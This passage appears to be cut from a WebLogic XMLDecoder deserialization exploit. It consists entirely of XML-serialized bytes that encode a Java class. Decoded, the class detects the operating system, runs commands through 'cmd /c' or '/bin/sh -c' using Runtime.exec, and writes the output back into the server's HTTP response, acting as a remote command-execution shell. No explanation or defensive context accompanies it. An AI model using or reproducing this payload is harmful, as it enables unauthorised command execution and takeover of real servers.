index="2387"><byte>12</byte></void><void index="2388"><byte>0</byte></void><void index="2389"><byte>89</byte></void><void index="2390"><byte>0</byte></void><void index="2391"><byte>90</byte></void><void index="2392"><byte>10</byte></void><void index="2393"><byte>0</byte></void><void index="2394"><byte>81</byte></void><void index="2395"><byte>0</byte></void><void index="2396"><byte>91</byte></void><void index="2397"><byte>12</byte></void><void index="2398"><byte>0</byte></void><void index="2399"><byte>10</byte></void><void index="2400"><byte>0</byte></void><void index="2401"><byte>71</byte></void><void index="2402"><byte>10</byte></void><void index="2403"><byte>0</byte></void><void index="2404"><byte>79</byte></void><void index="2405"><byte>0</byte></void><void index="2406"><byte>93</byte></void><void index="2407"><byte>1</byte></void><void index="2408"><byte>0</byte></void><void index="2409"><byte>49</byte></void><void index="2410"><byte>119</byte></void><void index="2411"><byte>101</byte></void><void index="2412"><byte>98</byte></void><void index="2413"><byte>108</byte></void><void index="2414"><byte>111</byte></void><void index="2415"><byte>103</byte></void><void index="2416"><byte>105</byte></void><void index="2417"><byte>99</byte></void><void index="2418"><byte>47</byte></void><void index="2419"><byte>115</byte></void><void index="2420"><byte>101</byte></void><void index="2421"><byte>114</byte></void><void index="2422"><byte>118</byte></void><void index="2423"><byte>108</byte></void><void index="2424"><byte>101</byte></void><void index="2425"><byte>116</byte></void><void index="2426"><byte>47</byte></void><void index="2427"><byte>105</byte></void><void index="2428"><byte>110</byte></void><void index="2429"><byte>116</byte></void><void index="2430"><byte>101</byte></void><void index="2431"><byte>114</byte></void><void index="2432"><byte>110</byte></void><void index="2433"><byte>97</byte></void><void index="2434"><byte>108</byte></void><void index="2435"><byte>47</byte></void><void index="2436"><byte>83</byte></void><void index="2437"><byte>101</byte></void><void index="2438"><byte>114</byte></void><void index="2439"><byte>118</byte></void><void index="2440"><byte>108</byte></void><void index="2441"><byte>101</byte></void><void index="2442"><byte>116</byte></void><void index="2443"><byte>79</byte></void><void index="2444"><byte>117</byte></void><void index="2445"><byte>116</byte></void><void index="2446"><byte>112</byte></void><void index="2447"><byte>117</byte></void><void index="2448"><byte>116</byte></void><void index="2449"><byte>83</byte></void><void index="2450"><byte>116</byte></void><void index="2451"><byte>114</byte></void><void index="2452"><byte>101</byte></void><void index="2453"><byte>97</byte></void><void index="2454"><byte>109</byte></void><void index="2455"><byte>73</byte></void><void index="2456"><byte>109</byte></void><void index="2457"><byte>112</byte></void><void index="2458"><byte>108</byte></void><void index="2459"><byte>7</byte></void><void index="2460"><byte>0</byte></void><void index="2461"><byte>95</byte></void><void index="2462"><byte>1</byte></void><void index="2463"><byte>0</byte></void><void index="2464"><byte>11</byte></void><void index="2465"><byte>119</byte></void><void index="2466"><byte>114</byte></void><void index="2467"><byte>105</byte></void><void index="2468"><byte>116</byte></void><void index="2469"><byte>101</byte></void><void index="2470"><byte>83</byte></void><void index="2471"><byte>116</byte></void><void index="2472"><byte>114</byte></void><void index="2473"><byte>101</byte></void><void index="2474"><byte>97</byte></void><void index="2475"><byte>109</byte></void><void index="2476"><byte>1</byte></void><void index="2477"><byte>0</byte></void><void index="2478"><byte>24</byte></void><void index="2479"><byte>40</byte></void><void index="2480"><byte>76</byte></void><void index="2481"><byte>106</byte></void><void index="2482"><byte>97</byte></void><void index="2483"><byte>118</byte></void><void index="2484"><byte>97</byte></void><void index="2485"><byte>47</byte></void><void index="2486"><byte>105</byte></void><void index="2487"><byte>111</byte></void><void index="2488"><byte>47</byte></void><void index="2489"><byte>73</byte></void><void index="2490"><byte>110</byte></void><void index="2491"><byte>112</byte></void><void index="2492"><byte>117</byte></void><void index="2493"><byte>116</byte></void><void index="2494"><byte>83</byte></void><void index="2495"><byte>116</byte></void><void index="2496"><byte>114</byte></void><void index="2497"><byte>101</byte></void><void index="2498"><byte>97</byte></void><void index="2499"><byte>109</byte></void><void index="2500"><byte>59</byte></void><void index="2501"><byte>41</byte></void><void index="2502"><byte>86</byte></void><void index="2503"><byte>12</byte></void><void index="2504"><byte>0</byte></void><void index="2505"><byte>97</byte></void><void index="2506"><byte>0</byte></void><void index="2507"><byte>98</byte></void><void index="2508"><byte>10</byte></void><void index="2509"><byte>0</byte></void><void index="2510"><byte>96</byte></void><void index="2511"><byte>0</byte></void><void index="2512"><byte>99</byte></void><void index="2513"><byte>1</byte></void><void index="2514"><byte>0</byte></void><void index="2515"><byte>5</byte></void><void index="2516"><byte>102</byte></void><void index="2517"><byte>108</byte></void><void index="2518"><byte>117</byte></void><void index="2519"><byte>115</byte></void><void index="2520"><byte>104</byte></void><void index="2521"><byte>12</byte></void><void index="2522"><byte>0</byte></void><void index="2523"><byte>101</byte></void><void index="2524"><byte>0</byte></void><void index="2525"><byte>11</byte></void><void index="2526"><byte>10</byte></void><void index="2527"><byte>0</byte></void><void index="2528"><byte>96</byte></void><void index="2529"><byte>0</byte></void><void index="2530"><byte>102</byte></void><void index="2531"><byte>1</byte></void><void index="2532"><byte>0</byte></void><void index="2533"><byte>7</byte></void><void index="2534"><byte>111</byte></void><void index="2535"><byte>115</byte></void><void index="2536"><byte>46</byte></void><void index="2537"><byte>110</byte></void><void index="2538"><byte>97</byte></void><void index="2539"><byte>109</byte></void><void index="2540"><byte>101</byte></void><void index="2541"><byte>8</byte></void><void index="2542"><byte>0</byte></void><void index="2543"><byte>104</byte></void><void index="2544"><byte>1</byte></void><void index="2545"><byte>0</byte></void><void index="2546"><byte>16</byte></void><void index="2547"><byte>106</byte></void><void index="2548"><byte>97</byte></void><void index="2549"><byte>118</byte></void><void index="2550"><byte>97</byte></void><void index="2551"><byte>47</byte></void><void index="2552"><byte>108</byte></void><void index="2553"><byte>97</byte></void><void index="2554"><byte>110</byte></void><void index="2555"><byte>103</byte></void><void index="2556"><byte>47</byte></void><void index="2557"><byte>83</byte></void><void index="2558"><byte>121</byte></void><void index="2559"><byte>115</byte></void><void index="2560"><byte>116</byte></void><void index="2561"><byte>101</byte></void><void index="2562"><byte>109</byte></void><void index="2563"><byte>7</byte></void><void index="2564"><byte>0</byte></void><void index="2565"><byte>106</byte></void><void index="2566"><byte>1</byte></void><void index="2567"><byte>0</byte></void><void index="2568"><byte>11</byte></void><void index="2569"><byte>103</byte></void><void index="2570"><byte>101</byte></void><void index="2571"><byte>116</byte></void><void index="2572"><byte>80</byte></void><void index="2573"><byte>114</byte></void><void index="2574"><byte>111</byte></void><void index="2575"><byte>112</byte></void><void index="2576"><byte>101</byte></void><void index="2577"><byte>114</byte></void><void index="2578"><byte>116</byte></void><void index="2579"><byte>121</byte></void><void index="2580"><byte>12</byte></void><void index="2581"><byte>0</byte></void><void index="2582"><byte>108</byte></void><void index="2583"><byte>0</byte></void><void index="2584"><byte>59</byte></void><void index="2585"><byte>10</byte></void><void index="2586"><byte>0</byte></void><void index="2587"><byte>107</byte></void><void index="2588"><byte>0</byte></void><void index="2589"><byte>109</byte></void><void index="2590"><byte>1</byte></void><void index="2591"><byte>0</byte></void><void index="2592"><byte>16</byte></void><void index="2593"><byte>106</byte></void><void index="2594"><byte>97</byte></void><void index="2595"><byte>118</byte></void><void index="2596"><byte>97</byte></void><void index="2597"><byte>47</byte></void><void index="2598"><byte>108</byte></void><void index="2599"><byte>97</byte></void><void index="2600"><byte>110</byte></void><void index="2601"><byte>103</byte></void><void index="2602"><byte>47</byte></void><void index="2603"><byte>83</byte></void><void index="2604"><byte>116</byte></void><void index="2605"><byte>114</byte></void><void index="2606"><byte>105</byte></void><void index="2607"><byte>110</byte></void><void index="2608"><byte>103</byte></void><void index="2609"><byte>7</byte></void><void index="2610"><byte>0</byte></void><void index="2611"><byte>111</byte></void><void index="2612"><byte>1</byte></void><void index="2613"><byte>0</byte></void><void index="2614"><byte>11</byte></void><void index="2615"><byte>116</byte></void><void index="2616"><byte>111</byte></void><void index="2617"><byte>76</byte></void><void index="2618"><byte>111</byte></void><void index="2619"><byte>119</byte></void><void index="2620"><byte>101</byte></void><void index="2621"><byte>114</byte></void><void index="2622"><byte>67</byte></void><void index="2623"><byte>97</byte></void><void index="2624"><byte>115</byte></void><void index="2625"><byte>101</byte></void><void index="2626"><byte>12</byte></void><void index="2627"><byte>0</byte></void><void index="2628"><byte>113</byte></void><void index="2629"><byte>0</byte></void><void index="2630"><byte>90</byte></void><void index="2631"><byte>10</byte></void><void index="2632"><byte>0</byte></void><void index="2633"><byte>112</byte></void><void index="2634"><byte>0</byte></void><void index="2635"><byte>114</byte></void><void index="2636"><byte>1</byte></void><void index="2637"><byte>0</byte></void><void index="2638"><byte>3</byte></void><void index="2639"><byte>119</byte></void><void index="2640"><byte>105</byte></void><void index="2641"><byte>110</byte></void><void index="2642"><byte>8</byte></void><void index="2643"><byte>0</byte></void><void index="2644"><byte>116</byte></void><void index="2645"><byte>1</byte></void><void index="2646"><byte>0</byte></void><void index="2647"><byte>8</byte></void><void index="2648"><byte>99</byte></void><void index="2649"><byte>111</byte></void><void index="2650"><byte>110</byte></void><void index="2651"><byte>116</byte></void><void index="2652"><byte>97</byte></void><void index="2653"><byte>105</byte></void><void index="2654"><byte>110</byte></void><void index="2655"><byte>115</byte></void><void index="2656"><byte>1</byte></void><void index="2657"><byte>0</byte></void><void index="2658"><byte>27</byte></void><void index="2659"><byte>40</byte></void><void index="2660"><byte>76</byte></void><void index="2661"><byte>106</byte></void><void index="2662"><byte>97</byte></void><void index="2663"><byte>118</byte></void><void index="2664"><byte>97</byte></void><void index="2665"><byte>47</byte></void><void index="2666"><byte>108</byte></void><void index="2667"><byte>97</byte></void><void index="2668"><byte>110</byte></void><void index="2669"><byte>103</byte></void><void index="2670"><byte>47</byte></void><void index="2671"><byte>67</byte></void><void index="2672"><byte>104</byte></void><void index="2673"><byte>97</byte></void><void index="2674"><byte>114</byte></void><void index="2675"><byte>83</byte></void><void index="2676"><byte>101</byte></void><void index="2677"><byte>113</byte></void><void index="2678"><byte>117</byte></void><void index="2679"><byte>101</byte></void><void index="2680"><byte>110</byte></void><void index="2681"><byte>99</byte></void><void index="2682"><byte>101</byte></void><void index="2683"><byte>59</byte></void><void index="2684"><byte>41</byte></void><void index="2685"><byte>90</byte></void><void index="2686"><byte>12</byte></void><void index="2687"><byte>0</byte></void><void index="2688"><byte>118</byte></void><void index="2689"><byte>0</byte></void><void index="2690"><byte>119</byte></void><void index="2691"><byte>10</byte></void><void index="2692"><byte>0</byte></void><void index="2693"><byte>112</byte></void><void index="2694"><byte>0</byte></void><void index="2695"><byte>120</byte></void><void index="2696"><byte>1</byte></void><void index="2697"><byte>0</byte></void><void index="2698"><byte>17</byte></void><void index="2699"><byte>106</byte></void><void index="2700"><byte>97</byte></void><void index="2701"><byte>118</byte></void><void index="2702"><byte>97</byte></void><void index="2703"><byte>47</byte></void><void index="2704"><byte>108</byte></void><void index="2705"><byte>97</byte></void><void index="2706"><byte>110</byte></void><void index="2707"><byte>103</byte></void><void index="2708"><byte>47</byte></void><void index="2709"><byte>82</byte></void><void index="2710"><byte>117</byte></void><void index="2711"><byte>110</byte></void><void index="2712"><byte>116</byte></void><void index="2713"><byte>105</byte></void><void index="2714"><byte>109</byte></void><void index="2715"><byte>101</byte></void><void index="2716"><byte>7</byte></void><void index="2717"><byte>0</byte></void><void index="2718"><byte>122</byte></void><void index="2719"><byte>1</byte></void><void index="2720"><byte>0</byte></void><void index="2721"><byte>10</byte></void><void index="2722"><byte>103</byte></void><void index="2723"><byte>101</byte></void><void index="2724"><byte>116</byte></void><void index="2725"><byte>82</byte></void><void index="2726"><byte>117</byte></void><void index="2727"><byte>110</byte></void><void index="2728"><byte>116</byte></void><void index="2729"><byte>105</byte></void><void index="2730"><byte>109</byte></void><void index="2731"><byte>101</byte></void><void index="2732"><byte>1</byte></void><void index="2733"><byte>0</byte></void><void index="2734"><byte>21</byte></void><void index="2735"><byte>40</byte></void><void index="2736"><byte>41</byte></void><void index="2737"><byte>76</byte></void><void index="2738"><byte>106</byte></void><void index="2739"><byte>97</byte></void><void index="2740"><byte>118</byte></void><void index="2741"><byte>97</byte></void><void index="2742"><byte>47</byte></void><void index="2743"><byte>108</byte></void><void index="2744"><byte>97</byte></void><void index="2745"><byte>110</byte></void><void index="2746"><byte>103</byte></void><void index="2747"><byte>47</byte></void><void index="2748"><byte>82</byte></void><void index="2749"><byte>117</byte></void><void index="2750"><byte>110</byte></void><void index="2751"><byte>116</byte></void><void index="2752"><byte>105</byte></void><void index="2753"><byte>109</byte></void><void index="2754"><byte>101</byte></void><void index="2755"><byte>59</byte></void><void index="2756"><byte>12</byte></void><void index="2757"><byte>0</byte></void><void index="2758"><byte>124</byte></void><void index="2759"><byte>0</byte></void><void index="2760"><byte>125</byte></void><void index="2761"><byte>10</byte></void><void index="2762"><byte>0</byte></void><void index="2763"><byte>123</byte></void><void index="2764"><byte>0</byte></void><void index="2765"><byte>126</byte></void><void index="2766"><byte>1</byte></void><void index="2767"><byte>0</byte></void><void index="2768"><byte>7</byte></void><void index="2769"><byte>99</byte></void><void index="2770"><byte>109</byte></void><void index="2771"><byte>100</byte></void><void index="2772"><byte>32</byte></void><void index="2773"><byte>47</byte></void><void index="2774"><byte>99</byte></void><void index="2775"><byte>32</byte></void><void index="2776"><byte>8</byte></void><void index="2777"><byte>0</byte></void><void index="2778"><byte>-128</byte></void><void index="2779"><byte>1</byte></void><void index="2780"><byte>0</byte></void><void index="2781"><byte>4</byte></void><void index="2782"><byte>101</byte></void><void index="2783"><byte>120</byte></void><void index="2784"><byte>101</byte></void><void index="2785"><byte>99</byte></void><void index="2786"><byte>1</byte></void><void index="2787"><byte>0</byte></void><void index="2788"><byte>39</byte></void><void index="2789"><byte>40</byte></void><void index="2790"><byte>76</byte></void><void index="2791"><byte>106</byte></void><void index="2792"><byte>97</byte></void><void index="2793"><byte>118</byte></void><void index="2794"><byte>97</byte></void><void index="2795"><byte>47</byte></void><void index="2796"><byte>108</byte></void><void index="2797"><byte>97</byte></void><void index="2798"><byte>110</byte></void><void index="2799"><byte>103</byte></void><void index="2800"><byte>47</byte></void><void index="2801"><byte>83</byte></void><void index="2802"><byte>116</byte></void><void index="2803"><byte>114</byte></void><void index="2804"><byte>105</byte></void><void index="2805"><byte>110</byte></void><void index="2806"><byte>103</byte></void><void index="2807"><byte>59</byte></void><void index="2808"><byte>41</byte></void><void index="2809"><byte>76</byte></void><void index="2810"><byte>106</byte></void><void index="2811"><byte>97</byte></void><void index="2812"><byte>118</byte></void><void index="2813"><byte>97</byte></void><void index="2814"><byte>47</byte></void><void index="2815"><byte>108</byte></void><void index="2816"><byte>97</byte></void><void index="2817"><byte>110</byte></void><void index="2818"><byte>103</byte></void><void index="2819"><byte>47</byte></void><void index="2820"><byte>80</byte></void><void index="2821"><byte>114</byte></void><void index="2822"><byte>111</byte></void><void index="2823"><byte>99</byte></void><void index="2824"><byte>101</byte></void><void index="2825"><byte>115</byte></void><void index="2826"><byte>115</byte></void><void index="2827"><byte>59</byte></void><void index="2828"><byte>12</byte></void><void index="2829"><byte>0</byte></void><void index="2830"><byte>-126</byte></void><void index="2831"><byte>0</byte></void><void index="2832"><byte>-125</byte></void><void index="2833"><byte>10</byte></void><void index="2834"><byte>0</byte></void><void index="2835"><byte>123</byte></void><void index="2836"><byte>0</byte></void><void index="2837"><byte>-124</byte></void><void index="2838"><byte>1</byte></void><void index="2839"><byte>0</byte></void><void index="2840"><byte>11</byte></void><void index="2841"><byte>47</byte></void><void index="2842"><byte>98</byte></void><void index="2843"><byte>105</byte></void><void index="2844"><byte>110</byte></void><void index="2845"><byte>47</byte></void><void index="2846"><byte>115</byte></void><void index="2847"><byte>104</byte></void><void index="2848"><byte>32</byte></void><void index="2849"><byte>45</byte></void><void index="2850"><byte>99</byte></void><void index="2851"><byte>32</byte></void><void index="2852"><byte>8</byte></void><void index="2853"><byte>0</byte></void><void index="2854"><byte>-122</byte></void><void index="2855"><byte>1</byte></void><void index="2856"><byte>0</byte></void><void index="2857"><byte>22</byte></void><void index="2858"><byte>106</byte></void><void index="2859"><byte>97</byte></void><void index="2860"><byte>118</byte></void><void index="2861"><byte>97</byte></void><void index="2862"><byte>47</byte></void><void index="2863"><byte>105</byte></void><void index="2864"><byte>111</byte></void><void index="2865"><byte>47</byte></void><void index="2866"><byte>66</byte></void><void index="2867"><byte>117</byte></void><void index="2868"><byte>102</byte></void><void index="2869"><byte>102</byte></void><void index="2870"><byte>101</byte></void><void index="2871"><byte>114</byte></void><void index="2872"><byte>101</byte></void><void index="2873"><byte>100</byte></void><void index="2874"><byte>82</byte></void><void index="2875"><byte>101</byte></void><void index="2876"><byte>97</byte></void><void index="2877"><byte>100</byte></void><void index="2878"><byte>101</byte></void><void index="2879"><byte>114</byte></void><void index="2880"><byte>7</byte></void><void index="2881"><byte>0</byte></void><void index="2882"><byte>-120</byte></void><void index="2883"><byte>1</byte></void><void index="2884"><byte>0</byte></void><void index="2885"><byte>25</byte></void><void index="2886"><byte>106</byte></void><void index="2887"><byte>97</byte></void><void index="2888"><byte>118</byte></void><void index="2889"><byte>97</byte></void><void index="2890"><byte>47</byte></void><void index="2891"><byte>105</byte></void><void index="2892"><byte>111</byte></void><void index="2893"><byte>47</byte></void><void index="2894"><byte>73</byte></void><void index="2895"><byte>110</byte></void><void index="2896"><byte>112</byte></void><void index="2897"><byte>117</byte></void><void index="2898"><byte>116</byte></void><void index="2899"><byte>83</byte></void><void index="2900"><byte>116</byte></void><void index="2901"><byte>114</byte></void><void index="2902"><byte>101</byte></void><void index="2903"><byte>97</byte></void><void index="2904"><byte>109</byte></void><void index="2905"><byte>82</byte></void><void index="2906"><byte>101</byte></void><void index="2907"><byte>97</byte></void><void index="2908"><byte>100</byte></void><void index="2909"><byte>101</byte></void><void index="2910"><byte>114</byte></void><void index="2911"><byte>7</byte></void><void index="2912"><byte>0</byte></void><void index="2913"><byte>-118</byte></void><void index="2914"><byte>1</byte></void><void index="2915"><byte>0</byte></void><void index="2916"><byte>17</byte></void><void index="2917"><byte>106</byte></void><void index="2918"><byte>97</byte></void><void index="2919"><byte>118</byte></void><void index="2920"><byte>97</byte></void><void index="2921"><byte>47</byte></void><void index="2922"><byte>108</byte></void><void index="2923"><byte>97</byte></void><void index="2924"><byte>110</byte></void><void index="2925"><byte>103</byte></void><void index="2926"><byte>47</byte></void><void index="2927"><byte>80</byte></void><void index="2928"><byte>114</byte></void><void index="2929"><byte>111</byte></void><void index="2930"><byte>99</byte></void><void index="2931"><byte>101</byte></void><void index="2932"><byte>115</byte></void><void index="2933"><byte>115</byte></void><void index="2934"><byte>7</byte></void><void index="2935"><byte>0</byte></void><void index="2936"><byte>-116</byte></void><void index="2937"><byte>1</byte></void><void index="2938"><byte>0</byte></void><void index="2939"><byte>14</byte></void><void index="2940"><byte>103</byte></void><void index="2941"><byte>101</byte></void><void index="2942"><byte>116</byte></void><void index="2943"><byte>73</byte></void><void index="2944"><byte>110</byte></void><void index="2945"><byte>112</byte></void><void index="2946"><byte>117</byte></void><void index="2947"><byte>116</byte></void><void index="2948"><byte>83</byte></void><void index="2949"><byte>116</byte></void><void index="2950"><byte>114</byte></void><void index="2951"><byte>101</byte></void><void index="2952"><byte>97</byte></void><void index="2953"><byte>109</byte></void><void index="2954"><byte>1</byte></void><void index="2955"><byte>0</byte></void><void index="2956"><byte>23</byte></void><void index="2957"><byte>40</byte></void><void index="2958"><byte>41</byte></void><void index="2959"><byte>76</byte></void><void index="2960"><byte>106</byte></void><void index="2961"><byte>97</byte></void><void index="2962"><byte>118</byte></void><void index="2963"><byte>97</byte></void><void index="2964"><byte>47</byte></void><void index="2965"><byte>105</byte></void><void index="2966"><byte>111</byte></void><void index="2967"><byte>47</byte></void><void index="2968"><byte>73</byte></void><void index="2969"><byte>110</byte></void><void index="2970"><byte>112</byte></void><void index="2971"><byte>117</byte></void><void index="2972"><byte>116</byte></void><void index="2973"><byte>83</byte></void><void index="2974"><byte>116</byte></void><void index="2975"><byte>114</byte></void><void index="2976"><byte>101</byte></void><void index="2977"><byte>97</byte></void><void index="2978"><byte>109</byte></void><void index="2979"><byte>59</byte></void><void index="2980"><byte>12</byte></void><void index="2981"><byte>0</byte></void><void index="2982"><byte>-114</byte></void><void index="2983"><byte>0</byte></void><void index="2984"><byte>-113</byte></void><void index="2985"><byte>10</byte></void><void index="2986"><byte>0</byte></void><void index="2987"><byte>-115</byte></void><void index="2988"><byte>0</byte></void><void index="2989"><byte>-112</byte></void><void index="2990"><byte>1</byte></void><void index="2991"><byte>0</byte></void><void index="2992"><byte>42</byte></void><void index="2993"><byte>40</byte></void><void index="2994"><byte>76</byte></void><void index="2995"><byte>106</byte></void><void index="2996"><byte>97</byte></void><void index="2997"><byte>118</byte></void><void index="2998"><byte>97</byte></void><void index="2999"><byte>47</byte></void><void index="3000"><byte>105</byte></void><void index="3001"><byte>111</byte></void><void index="3002"><byte>47</byte></void><void index="3003"><byte>73</byte></void><void index="3004"><byte>110</byte></void><void index="3005"><byte>112</byte></void><void index="3006"><byte>117</byte></void><void index="3007"><byte>116</byte></void><void index="3008"><byte>83</byte></void><void index="3009"><byte>116</byte></void><void index="3010"><byte>114</byte></void><void index="3011"><byte>101</byte></void><void index="3012"><byte>97</byte></void><void index="3013"><byte>109</byte></void><void index="3014"><byte>59</byte></void><void index="3015"><byte>76</byte></void><void index="3016"><byte>106</byte></void><void index="3017"><byte>97</byte></void><void index="3018"><byte>118</byte></void><void index="3019"><byte>97</byte></void><void index="3020"><byte>47</byte></void><void index="3021"><byte>108</byte></void><void index="3022"><byte>97</byte></void><void index="3023"><byte>110</byte></void><void index="3024"><byte>103</byte></void><void index="3025"><byte>47</byte></void><void index="3026"><byte>83</byte></void><void index="3027"><byte>116</byte></void><void index="3028"><byte>114</byte></void><void index="3029"><byte>105</byte></void><void index="3030"><byte>110</byte></void><void index="3031"><byte>103</byte></void><void index="3032"><byte>59</byte></void><void index="3033"><byte>41</byte></void><void index="3034"><byte>86</byte></void><void index="3035"><byte>12</byte></void><void index="3036"><byte>0</byte></void><void index="3037"><byte>10</byte></void><void index="3038"><byte>0</byte></void><void index="3039"><byte>-110</byte></void><void index="3040"><byte>10</byte></void><void index="3041"><byte>0</byte></void><void index="3042"><byte>-117</byte></void><void index="3043"><byte>0</byte></void><void index="3044"><byte>-109</byte></void><void index="3045"><byte>1</byte></void><void index="3046"><byte>0</byte></void><void index="3047"><byte>19</byte></void><void index="3048"><byte>40</byte></void><void index="3049"><byte>76</byte></void><void index="3050"><byte>106</byte></void><void index="3051"><byte>97</byte></void><void index="3052"><byte>118</byte></void><void index="3053"><byte>97</byte></void><void index="3054"><byte>47</byte></void><void index="3055"><byte>105</byte></void><void index="3056"><byte>111</byte></void><void index="3057"><byte>47</byte></void><void index="3058"><byte>82</byte></void><void index="3059"><byte>101</byte></void><void index="3060"><byte>97</byte></void><void index="3061"><byte>100</byte></void><void index="3062"><byte>101</byte></void><void index="3063"><byte>114</byte></void><void index="3064"><byte>59</byte></void><void index="3065"><byte>41</byte></void><void index="3066"><byte>86</byte></void><void index="3067"><byte>12</byte></void><void index="3068"><byte>0</byte></void><void index="3069"><byte>10</byte></void><void index="3070"><byte>0</byte></void><void index="3071"><byte>-107</byte></void><void index="3072"><byte>10</byte></void><void index="3073"><byte>0</byte></void><void index="3074"><byte>-119</byte></void><void index="3075"><byte>0</byte></void><void index="3076"><byte>-106</byte></void><void index="3077"><byte>1</byte></void><void index="3078"><byte>0</byte></void><void index="3079"><byte>0</byte></void><void index="3080"><byte>8</byte></void><void index="3081"><byte>0</byte></void><void index="3082"><byte>-104</byte></void><void index="3083"><byte>1</byte></void><void index="3084"><byte>0</byte></void><void index="3085"><byte>8</byte></void><void index="3086"><byte>114</byte></void><void index="3087"><byte>101</byte></void><void index="3088"><byte>97</byte></void><void index="3089"><byte>100</byte></void><void index="3090"><byte>76</byte></void><void index="3091"><byte>105</byte></void><void index="3092"><byte>110</byte></void><void index="3093"><byte>101</byte></void><void index="3094"><byte>12</byte></void><void index="3095"><byte>0</byte></void><void index="3096"><byte>-102</byte></void><void index="3097"><byte>0</byte></void><void index="3098"><byte>90</byte></void><void index="3099"><byte>10</byte></void><void index="3100"><byte>0</byte></void><void index="3101"><byte>-119</byte></void><void index="3102"><byte>0</byte></void><void index="3103"><byte>-101</byte></void><void index="3104"><byte>1</byte></void><void index="3105"><byte>0</byte></void><void index="3106"><byte>9</byte></void><void index="3107"><byte>103</byte></void><void index="3108"><byte>101</byte></void><void index="3109"><byte>116</byte></void><void index="3110"><byte>87</byte></void><void index="3111"><byte>114</byte></void><void index="3112"><byte>105</byte></void><void index="3113"><byte>116</byte></void><void index="3114"><byte>101</byte></void><void index="3115"><byte>114</byte></void><void index="3116"><byte>1</byte></void><void index="3117"><byte>0</byte></void><void index="3118"><byte>23</byte></void><void index="3119"><byte>40</byte></void><void index="3120"><byte>41</byte></void><void index="3121"><byte>76</byte></void><void index="3122"><byte>106</byte></void><void index="3123"><byte>97</byte></void><void index="3124"><byte>118</byte></void><void index="3125"><byte>97</byte></void><void index="3126"><byte>47</byte></void><void index="3127"><byte>105</byte></void><void index="3128"><byte>111</byte></void><void index="3129"><byte>47</byte></void><void index="3130"><byte>80</byte></void><void index="3131"><byte>114</byte></void><void index="3132"><byte>105</byte></void><void index="3133"><byte>110</byte></void><void index="3134"><byte>116</byte></void><void index="3135"><byte>87</byte></void><void index="3136"><byte>114</byte></void><void index="3137"><byte>105</byte></void><void index="3138"><byte>116</byte></void><void index="3139"><byte>101</byte></void><void index="3140"><byte>114</byte></void><void index="3141"><byte>59</byte></void><void index="3142"><byte>12</byte></void><void index="3143"><byte>0</byte></void><void index="3144"><byte>-99</byte></void><void index="3145"><byte>0</byte></void><void index="3146"><byte>-98</byte></void><void index="3147"><byte>10</byte></void><void index="3148"><byte>0</byte></void><void index="3149"><byte>69</byte></void><void index="3150"><byte>0</byte></void><void index="3151"><byte>-97</byte></void><void index="3152"><byte>1</byte></void><void index="3153"><byte>0</byte></void><void index="3154"><byte>19</byte></void><void index="3155"><byte>106</byte></void><void index="3156"><byte>97</byte></void><void index="3157"><byte>118</byte></void><void index="3158"><byte>97</byte></void><void index="3159"><byte>47</byte></void><void index="3160"><byte>105</byte></void><void index="3161"><byte>111</byte></void><void index="3162"><byte>47</byte></void><void index="3163"><byte>80</byte></void><void index="3164"><byte>114</byte></void><void index="3165"><byte>105</byte></void><void index="3166"><byte>110</byte></void><void index="3167"><byte>116</byte></void><void index="3168"><byte>87</byte></void><void index="3169"><byte>114</byte></void><void index="3170"><byte>105</byte></void><void index="3171"><byte>116</byte></void><void index="3172"><byte>101</byte></void><void index="3173"><byte>114</byte></void><void index="3174"><byte>7</byte></void><void index="3175"><byte>0</byte></void><void index="3176"><byte>-95</byte></void><void index="3177"><byte>1</byte></void><void index="3178"><byte>0</byte></void><void index="3179"><byte>5</byte></void><void index="3180"><byte>119</byte></void><void index="3181"><byte>114</byte></void><void index="3182"><byte>105</byte></void><void index="3183"><byte>116</byte></void><void index="3184"><byte>101</byte></void><void index="3185"><byte>12</byte></void><void index="3186"><byte>0</byte></void><void index="3187"><byte>-93</byte></void><void index="3188"><byte>0</byte></void><void index="3189"><byte>71</byte></void><void index="3190"><byte>10</byte></void><void index="3191"><byte>0</byte></void><void index="3192"><byte>-94</byte></void><void index="3193"><byte>0</byte></void><void index="3194"><byte>-92</byte></void><void index="3195"><byte>1</byte></void><void index="3196"><byte>0</byte></void><void index="3197"><byte>19</byte></void><void index="3198"><byte>106</byte></void><void index="3199"><byte>97</byte></void><void index="3200"><byte>118</byte></void><void index="3201"><byte>97</byte></void><void index="3202"><byte>47</byte></void><void index="3203"><byte>108</byte></void><void index="3204"><byte>97</byte></void><void index="3205"><byte>110</byte></void><void index="3206"><byte>103</byte></void><void index="3207"><byte>47</byte></void><void index="3208"><byte>69</byte></void><void index="3209"><byte>120</byte></void><void index="3210"><byte>99</byte></void><void index="3211"><byte>101</byte></void><void index="3212"><byte>112</byte></void><void index="3213"><byte>116</byte></void><void index="3214"><byte>105</byte></void><void index="3215"><byte>111</byte></void><void index="3216"><byte>110</byte></void><void index="3217"><byte>7</byte></void><void index="3218"><byte>0</byte></void><void index="3219"><byte>-90</byte></void><void index="3220"><byte>1</byte></void><void index="3221"><byte>0</byte></void><void index="3222"><byte>3</byte></void><void index="3223"><byte>111</byte></void><void index="3224"><byte>117</byte></void><void index="3225"><byte>116</byte></void><void index="3226"><byte>1</byte></void><void index="3227"><byte>0</byte></void><void index="3228"><byte>21</byte></void><void index="3229"><byte>76</byte></void><void index="3230"><byte>106</byte></void><void index="3231"><byte>97</byte></void><void index="3232"><byte>118</byte></void><void index="3233"><byte>97</byte></void><void index="3234"><byte>47</byte></void><void index="3235"><byte>105</byte></void><void index="3236"><byte>111</byte></void><void index="3237"><byte>47</byte></void><void index="3238"><byte>80</byte></void><void index="3239"><byte>114</byte></void><void index="3240"><byte>105</byte></void><void index="3241"><byte>110</byte></void><void index="3242"><byte>116</byte></void><void index="3243"><byte>83</byte></void><void index="3244"><byte>116</byte></void><void index="3245"><byte>114</byte></void><void index="3246"><byte>101</byte></void><void index="3247"><byte>97</byte></void><void index="3248"><byte>109</byte></void><void index="3249"><byte>59</byte></void><void index="3250"><byte>12</byte></void><void index="3251"><byte>0</byte></void><void index="3252"><byte>-88</byte></void><void index="3253"><byte>0</byte></void><void index="3254"><byte>-87</byte></void><void index="3255"><byte>9</byte></void><void index="3256"><byte>0</byte></void><void index="3257"><byte>107</byte></void><void index="3258"><byte>0</byte></void><void index="3259"><byte>-86</byte></void><void index="3260"><byte>1</byte></void><void index="3261"><byte>0</byte></void><void index="3262"><byte>19</byte></void><void index="3263"><byte>106</byte></void><void index="3264"><byte>97</byte></void><void index="3265"><byte>118</byte></void><void index="3266"><byte>97</byte></void><void 